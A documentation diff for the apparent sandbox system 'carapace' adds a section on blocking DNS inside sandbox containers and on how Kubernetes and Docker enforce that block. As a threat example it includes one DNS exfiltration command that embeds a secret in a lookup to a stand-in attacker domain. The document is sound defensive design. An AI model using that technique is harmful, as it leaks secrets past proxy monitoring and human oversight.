@@ -142,6 +142,22 @@ All outbound traffic from sandbox containers is routed through the carapace serv
 - Containers receive only `HTTP_PROXY` / `HTTPS_PROXY` environment variables pointing to the proxy
 - No direct internet access — enforced by Docker network isolation or Kubernetes NetworkPolicy
 - The proxy uses per-session token-based authentication (injected as `Proxy-Authorization` via environment setup script)
+- No DNS: the sandbox cannot resolve any name itself (see below)
+
+### No DNS from the sandbox
+
+A resolver that forwards external names is a channel past the proxy: `getent hosts $(secret).evil.tld`, or any `getaddrinfo` call inside a script, carries data to whoever runs the authoritative server for `evil.tld`, and the sentinel never sees it. The sandbox needs no DNS:
+
+- It reaches the server by IP. The proxy URL, the git origin (`GIT_REPO_URL`), `CARAPACE_API_URL` and `NO_PROXY` are all built from the server's IP on the sandbox network (Docker) or its ClusterIP (Kubernetes).
+- Proxy-aware tools send the hostname to the proxy, which resolves it on the server. pip, uv, npm, git over HTTPS and curl all work this way.
+- [Exec-scoped tunnels](#exec-scoped-tcp-tunnels) shadow their hostnames in `/etc/hosts`.
+
+How each runtime enforces it:
+
+- **Kubernetes**: sandbox pods get `dnsPolicy: None` with `127.0.0.1` as their only nameserver. Nothing listens there, so lookups fail immediately. The NetworkPolicy no longer allows egress to kube-dns either. The pod setting also holds where no NetworkPolicy is enforced.
+- **Docker**: Docker's embedded DNS (`127.0.0.11`) answers only names on the network itself (other containers) for containers on an `internal` network such as `carapace-sandbox`. It does not forward other queries upstream (verified with a packet capture on Docker Engine 29), so carapace configures nothing extra. On another engine version, check that `getent hosts example.com` fails inside a sandbox.
+
+Tools that insist on resolving a hostname locally before they connect fail in the sandbox. Proxy-aware clients are unaffected.
 
 ### Domain allowlisting
 
